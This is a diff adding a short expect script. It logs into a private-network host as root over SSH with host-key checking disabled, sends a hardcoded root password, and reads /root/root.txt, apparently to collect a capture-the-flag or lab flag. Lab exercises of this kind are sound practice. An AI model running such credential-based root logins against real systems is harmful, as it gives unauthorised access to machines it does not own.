@@ -1,0 +1,7 @@
+#!/usr/bin/expect -f
+spawn ssh -o StrictHostKeyChecking=no root@10.65.128.230
+expect "password:"
+send "hikari\r"
+expect "#"
+send "cat /root/root.txt\r"
+expect eof
